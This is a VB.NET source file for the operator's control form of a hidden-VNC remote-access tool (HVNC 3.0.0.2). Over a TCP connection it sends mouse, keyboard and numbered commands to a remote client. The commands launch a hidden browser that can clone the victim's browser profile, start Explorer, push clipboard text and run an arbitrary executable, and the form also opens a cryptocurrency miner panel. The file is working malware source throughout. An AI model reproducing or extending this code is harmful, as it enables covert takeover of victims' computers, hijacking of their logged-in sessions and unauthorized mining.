Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Drawing
Imports System.Threading
Imports System.IO
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Runtime.Serialization.Formatters
Imports System.Runtime.Serialization.Formatters.Binary
Imports System.Windows.Forms

Namespace HVNC
	Partial Public Class FrmVNC
		Inherits Form

		Private tcpClient_0 As TcpClient

		Private int_0 As Integer

		Private bool_1 As Boolean

		Private bool_2 As Boolean

		Public FrmTransfer0 As FrmTransfer

		Public Miner_0 As FrmMiner

		Public Property VNCBoxe() As PictureBox
			Get
				Return Me.VNCBox
			End Get
			Set(ByVal value As PictureBox)
				VNCBox = value
			End Set
		End Property

		Public Property toolStripStatusLabel2_() As ToolStripStatusLabel
			Get
				Return Me.toolStripStatusLabel2
			End Get
			Set(ByVal value As ToolStripStatusLabel)
				toolStripStatusLabel2 = value
			End Set
		End Property


		Public Sub New()
			int_0 = 0
			bool_1 = True
			bool_2 = False
			FrmTransfer0 = New FrmTransfer()
			Miner_0 = New FrmMiner()
			InitializeComponent()

			AddHandler VNCBox.MouseEnter, AddressOf VNCBox_MouseEnter
			AddHandler VNCBox.MouseLeave, AddressOf VNCBox_MouseLeave
			AddHandler VNCBox.KeyPress, AddressOf VNCBox_KeyPress

		End Sub


		Private Sub VNCBox_MouseEnter(ByVal sender As Object, ByVal e As EventArgs)
			VNCBox.Focus()
		End Sub

		Private Sub VNCBox_MouseLeave(ByVal sender As Object, ByVal e As EventArgs)
			FindForm().ActiveControl = Nothing
		End Sub
		Private Sub VNCBox_KeyPress(ByVal sender As Object, ByVal e As KeyPressEventArgs)
			SendTCP("7*" & Conversions.ToString(e.KeyChar), tcpClient_0)
		End Sub

		Private Sub VNCForm_Load(ByVal sender As Object, ByVal e As EventArgs) Handles MyBase.Load

			If FrmTransfer0.IsDisposed Then
				FrmTransfer0 = New FrmTransfer()
			End If

			FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(MyBase.Tag)

			tcpClient_0 = DirectCast(MyBase.Tag, TcpClient)

			VNCBox.Tag = New Size(1028, 1028)

			SendTCP("0*", tcpClient_0)

		End Sub



		Public Sub Check()
			Try
				If FrmTransfer0.FileTransferLabele.Text Is Nothing Then
					toolStripStatusLabel2.Text = "Idle"
				Else
					toolStripStatusLabel2.Text = FrmTransfer0.FileTransferLabele.Text
				End If

			Catch

			End Try

		End Sub


		Private Sub timer1_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles timer1.Tick



'INSTANT VB TODO TASK: There is no equivalent to a 'checked' block in VB:
'			checked
				int_0 += 100
				If int_0 >= SystemInformation.DoubleClickTime Then
					bool_1 = True
					bool_2 = False
					int_0 = 0
				End If
'INSTANT VB TODO TASK: End of the original C# 'checked' block.
		End Sub

		Private Sub CopyBtn_Click(ByVal sender As Object, ByVal e As EventArgs) Handles CopyBtn.Click
			SendTCP("9*", tcpClient_0)
		End Sub

		Private Sub PasteBtn_Click(ByVal sender As Object, ByVal e As EventArgs) Handles PasteBtn.Click

			Try
				SendTCP("10*" & Clipboard.GetText(), tcpClient_0)
			Catch projectError As Exception
				ProjectData.SetProjectError(projectError)
				ProjectData.ClearProjectError()
			End Try
		End Sub

		Private Sub ShowStart_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ShowStart.Click
			SendTCP("13*", tcpClient_0)
		End Sub

		Private Sub VNCBox_MouseDown(ByVal sender As Object, ByVal e As MouseEventArgs) Handles VNCBox.MouseDown

			If bool_1 Then
				bool_1 = False
				timer1.Start()
			ElseIf int_0 < SystemInformation.DoubleClickTime Then
				bool_2 = True
			End If
'INSTANT VB NOTE: The variable location was renamed since Visual Basic does not handle local variables named the same as class members well:
			Dim location_Renamed As Point = e.Location
'INSTANT VB NOTE: The variable tag was renamed since Visual Basic does not handle local variables named the same as class members well:
			Dim tag_Renamed As Object = VNCBox.Tag
'INSTANT VB NOTE: The variable size was renamed since Visual Basic does not handle local variables named the same as class members well:
			Dim size_Renamed As Size = (If(tag_Renamed IsNot Nothing, (DirectCast(tag_Renamed, Size)), Nothing))
			Dim num As Double = CDbl(VNCBox.Width) / CDbl(size_Renamed.Width)
			Dim num2 As Double = CDbl(VNCBox.Height) / CDbl(size_Renamed.Height)
			Dim num3 As Double = Math.Ceiling(CDbl(location_Renamed.X) / num)
			Dim num4 As Double = Math.Ceiling(CDbl(location_Renamed.Y) / num2)
			If bool_2 Then
				If e.Button = MouseButtons.Left Then
					SendTCP("6*" & Conversions.ToString(num3) & "*" & Conversions.ToString(num4), tcpClient_0)
				End If
			ElseIf e.Button = MouseButtons.Left Then
				SendTCP("2*" & Conversions.ToString(num3) & "*" & Conversions.ToString(num4), tcpClient_0)
			ElseIf e.Button = MouseButtons.Right Then
				SendTCP("3*" & Conversions.ToString(num3) & "*" & Conversions.ToString(num4), tcpClient_0)
			End If
		End Sub

		Private Sub VNCBox_MouseUp(ByVal sender As Object, ByVal e As MouseEventArgs) Handles VNCBox.MouseUp
'INSTANT VB NOTE: The variable location was renamed since Visual Basic does not handle local variables named the same as class members well:
			Dim location_Renamed As Point = e.Location
'INSTANT VB NOTE: The variable tag was renamed since Visual Basic does not handle local variables named the same as class members well:
			Dim tag_Renamed As Object = VNCBox.Tag
'INSTANT VB NOTE: The variable size was renamed since Visual Basic does not handle local variables named the same as class members well:
			Dim size_Renamed As Size = (If(tag_Renamed IsNot Nothing, (DirectCast(tag_Renamed, Size)), Nothing))
			Dim num As Double = CDbl(VNCBox.Width) / CDbl(size_Renamed.Width)
			Dim num2 As Double = CDbl(VNCBox.Height) / CDbl(size_Renamed.Height)
			Dim num3 As Double = Math.Ceiling(CDbl(location_Renamed.X) / num)
			Dim num4 As Double = Math.Ceiling(CDbl(location_Renamed.Y) / num2)
			If e.Button = MouseButtons.Left Then
				SendTCP("4*" & Conversions.ToString(num3) & "*" & Conversions.ToString(num4), tcpClient_0)
			ElseIf e.Button = MouseButtons.Right Then
				SendTCP("5*" & Conversions.ToString(num3) & "*" & Conversions.ToString(num4), tcpClient_0)
			End If
		End Sub

		Private Sub VNCBox_MouseMove(ByVal sender As Object, ByVal e As MouseEventArgs) Handles VNCBox.MouseMove
'INSTANT VB NOTE: The variable location was renamed since Visual Basic does not handle local variables named the same as class members well:
			Dim location_Renamed As Point = e.Location
'INSTANT VB NOTE: The variable tag was renamed since Visual Basic does not handle local variables named the same as class members well:
			Dim tag_Renamed As Object = VNCBox.Tag
'INSTANT VB NOTE: The variable size was renamed since Visual Basic does not handle local variables named the same as class members well:
			Dim size_Renamed As Size = (If(tag_Renamed IsNot Nothing, (DirectCast(tag_Renamed, Size)), Nothing))
			Dim num As Double = CDbl(VNCBox.Width) / CDbl(size_Renamed.Width)
			Dim num2 As Double = CDbl(VNCBox.Height) / CDbl(size_Renamed.Height)
			Dim num3 As Double = Math.Ceiling(CDbl(location_Renamed.X) / num)
			Dim num4 As Double = Math.Ceiling(CDbl(location_Renamed.Y) / num2)
			SendTCP("8*" & Conversions.ToString(num3) & "*" & Conversions.ToString(num4), tcpClient_0)
		End Sub

		Private Sub IntervalScroll_Scroll(ByVal sender As Object, ByVal e As EventArgs) Handles IntervalScroll.Scroll

			IntervalLabel.Text = "Interval (ms): " & Conversions.ToString(IntervalScroll.Value)
			SendTCP("17*" & Conversions.ToString(IntervalScroll.Value), tcpClient_0)
		End Sub

		Private Sub QualityScroll_Scroll(ByVal sender As Object, ByVal e As EventArgs) Handles QualityScroll.Scroll


			QualityLabel.Text = "Quality : " & Conversions.ToString(QualityScroll.Value) & "%"
			SendTCP("18*" & Conversions.ToString(QualityScroll.Value), tcpClient_0)
		End Sub

		Private Sub ResizeScroll_Scroll(ByVal sender As Object, ByVal e As EventArgs) Handles ResizeScroll.Scroll
			ResizeLabel.Text = "Resize : " & Conversions.ToString(ResizeScroll.Value) & "%"
			SendTCP("19*" & Conversions.ToString(CDbl(ResizeScroll.Value) / 100.0), tcpClient_0)
		End Sub

		Private Sub RestoreMaxBtn_Click(ByVal sender As Object, ByVal e As EventArgs) Handles RestoreMaxBtn.Click

			SendTCP("15*", tcpClient_0)
		End Sub

		Private Sub MinBtn_Click(ByVal sender As Object, ByVal e As EventArgs) Handles MinBtn.Click

			SendTCP("14*", tcpClient_0)
		End Sub

		Private Sub CloseBtn_Click(ByVal sender As Object, ByVal e As EventArgs) Handles CloseBtn.Click
			SendTCP("16*", tcpClient_0)
		End Sub

		Private Sub StartExplorer_Click(ByVal sender As Object, ByVal e As EventArgs) Handles StartExplorer.Click
			SendTCP("21*", tcpClient_0)
		End Sub

		Private Sub StartBrowserBtn_Click(ByVal sender As Object, ByVal e As EventArgs) Handles StartBrowserBtn.Click

			If chkClone.Checked = True Then
				If FrmTransfer0.IsDisposed Then
					FrmTransfer0 = New FrmTransfer()
				End If
				FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(MyBase.Tag)
				FrmTransfer0.Hide()

				SendTCP("11*" & Conversions.ToString(True), DirectCast(MyBase.Tag, TcpClient))
			Else
				SendTCP("11*" & Conversions.ToString(False), DirectCast(MyBase.Tag, TcpClient))
			End If

		End Sub

		Private Sub SendTCP(ByVal object_0 As Object, ByVal tcpClient_1 As TcpClient)

'INSTANT VB TODO TASK: There is no equivalent to a 'checked' block in VB:
'			checked
				Try
					SyncLock tcpClient_1
						Dim binaryFormatter As New BinaryFormatter()
						binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple
						binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways
						binaryFormatter.FilterLevel = TypeFilterLevel.Full
						Dim objectValue As Object = RuntimeHelpers.GetObjectValue(object_0)
						Dim num As ULong = 0uL
						Dim memoryStream As New MemoryStream()
						binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue))
						num = CULng(memoryStream.Position)
						tcpClient_1.GetStream().Write(BitConverter.GetBytes(num), 0, 8)
						Dim buffer() As Byte = memoryStream.GetBuffer()
						tcpClient_1.GetStream().Write(buffer, 0, CInt(num))
						memoryStream.Close()
						memoryStream.Dispose()
					End SyncLock
				Catch projectError As Exception
					ProjectData.SetProjectError(projectError)
					ProjectData.ClearProjectError()
				End Try
'INSTANT VB TODO TASK: End of the original C# 'checked' block.
		End Sub

		Private Sub VNCForm_KeyPress(ByVal sender As Object, ByVal e As KeyPressEventArgs) Handles MyBase.KeyPress
			SendTCP("7*" & Conversions.ToString(e.KeyChar), tcpClient_0)
		End Sub

		Private Sub VNCForm_FormClosing(ByVal sender As Object, ByVal e As FormClosingEventArgs) Handles MyBase.FormClosing

			Hide()
			e.Cancel = True
			Miner_0.Hide()
		End Sub

		Private Sub VNCForm_Click(ByVal sender As Object, ByVal e As EventArgs) Handles MyBase.Click
			Me.method_18(DirectCast(Nothing, Object))
		End Sub

		Private Sub method_18(ByVal object_0 As Object)
			MyBase.ActiveControl = DirectCast(object_0, Control)
		End Sub

		Private Sub button1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles button1.Click

			If chkClone.Checked = True Then
				If FrmTransfer0.IsDisposed Then
					FrmTransfer0 = New FrmTransfer()
				End If
				FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(MyBase.Tag)
				FrmTransfer0.Hide()

				SendTCP("30*" & Conversions.ToString(True), DirectCast(MyBase.Tag, TcpClient))
			Else
				SendTCP("30*" & Conversions.ToString(False), DirectCast(MyBase.Tag, TcpClient))
			End If

		End Sub

		Private Sub button2_Click(ByVal sender As Object, ByVal e As EventArgs) Handles button2.Click

			If chkClone.Checked = True Then
				If FrmTransfer0.IsDisposed Then
					FrmTransfer0 = New FrmTransfer()
				End If
				FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(MyBase.Tag)
				FrmTransfer0.Hide()

				SendTCP("12*" & Conversions.ToString(True), DirectCast(MyBase.Tag, TcpClient))
			Else
				SendTCP("12*" & Conversions.ToString(False), DirectCast(MyBase.Tag, TcpClient))
			End If

		End Sub

		Private Sub button3_Click(ByVal sender As Object, ByVal e As EventArgs) Handles button3.Click

			If Miner_0.IsDisposed Then
				Miner_0 = New FrmMiner()
			End If

			Miner_0.Tag = RuntimeHelpers.GetObjectValue(MyBase.Tag)

			Miner_0.Text = Me.Text.Replace("{ HVNC 3.0.0.2 - Connected: Admin } - ", Nothing)

			Miner_0.Show()
		End Sub

		Private Sub timer2_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles timer2.Tick
			Check()
		End Sub

		Private Sub button4_Click(ByVal sender As Object, ByVal e As EventArgs) Handles button4.Click
			If chkClone.Checked = True Then
				If FrmTransfer0.IsDisposed Then
					FrmTransfer0 = New FrmTransfer()
				End If
				FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(MyBase.Tag)
				FrmTransfer0.Hide()

				SendTCP("32*" & Conversions.ToString(True), DirectCast(MyBase.Tag, TcpClient))
			Else
				SendTCP("32*" & Conversions.ToString(False), DirectCast(MyBase.Tag, TcpClient))
			End If
		End Sub

		Private Sub button5_Click(ByVal sender As Object, ByVal e As EventArgs) Handles button5.Click


		End Sub

		Private Sub closeToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles closeToolStripMenuItem.Click
'INSTANT VB NOTE: The variable dialogResult was renamed since Visual Basic does not handle local variables named the same as class members well:
			Dim dialogResult_Renamed As DialogResult = MessageBox.Show("Are you sure ? " & Environment.NewLine & Environment.NewLine & "You lose the connection !", "Close Connexion ?", MessageBoxButtons.YesNo, MessageBoxIcon.Warning)
			If dialogResult_Renamed = System.Windows.Forms.DialogResult.Yes Then
				SendTCP("24*", tcpClient_0)
				Close()
			End If

		End Sub

		Private Sub button6_Click(ByVal sender As Object, ByVal e As EventArgs) Handles button6.Click
			SendTCP("56*" & textBoxEXE.Text, DirectCast(MyBase.Tag, TcpClient))
		End Sub

		Private Sub button7_Click(ByVal sender As Object, ByVal e As EventArgs) Handles button7.Click
			SendTCP("4875*", tcpClient_0)
		End Sub

		Private Sub button8_Click(ByVal sender As Object, ByVal e As EventArgs) Handles button8.Click
			SendTCP("4876*", tcpClient_0)
		End Sub

		Private Sub VNCBox_Click(ByVal sender As Object, ByVal e As EventArgs) Handles VNCBox.Click

		End Sub

		Private Sub VNCBox_MouseHover(ByVal sender As Object, ByVal e As EventArgs) Handles VNCBox.MouseHover
			VNCBox.Focus()
		End Sub

	End Class
End Namespace
